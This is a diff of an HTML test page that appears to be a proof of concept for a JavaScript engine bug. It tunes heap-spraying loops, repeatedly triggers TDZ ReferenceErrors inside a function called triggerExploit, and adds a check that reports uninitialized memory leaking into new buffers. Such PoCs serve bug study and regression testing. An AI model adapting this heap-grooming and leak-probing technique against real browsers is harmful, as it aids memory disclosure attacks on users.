@@ -26,7 +26,7 @@
     <script>
         function stressHeap() {
             const buffers = [];
-            for (let i = 0; i < 50; i++) {
+            for (let i = 0; i < 100; i++) {
                 const buf = new Uint8Array(16 * 1024);
                 buf.fill(0x41);
                 buffers.push(buf);
@@ -38,6 +38,12 @@
             if (actual !== expected) {
                 throw `${message}. Expected '${expected}', but was '${actual}'`;
             }
+        }
+
+        function checkMemoryLeak() {
+            const buf = new Uint8Array(4);
+            buf.fill(0x46);
+            return buf[0] !== 0x46 ? `Leak: 0x${buf[0].toString(16)}` : null;
         }
 
         function triggerExploit() {
@@ -67,19 +73,23 @@
             stressHeap();
 
             alert('Creating B objects...');
-            for (let i = 0; i < 500; i++) {
+            for (let i = 0; i < 200; i++) {
                 new B(false);
             }
 
             alert('Triggering TDZ exceptions...');
             let exceptionCount = 0;
-            for (let i = 0; i < 500; i++) {
+            for (let i = 0; i < 200; i++) {
                 try {
                     new B(true);
                 } catch (e) {
                     exceptionCount++;
                     if (!(e instanceof ReferenceError)) {
                         alert(`Unexpected error at iteration ${i}: ${e.message}`);
+                    }
+                    const leak = checkMemoryLeak();
+                    if (leak) {
+                        alert(leak);
                     }
                 }
             }
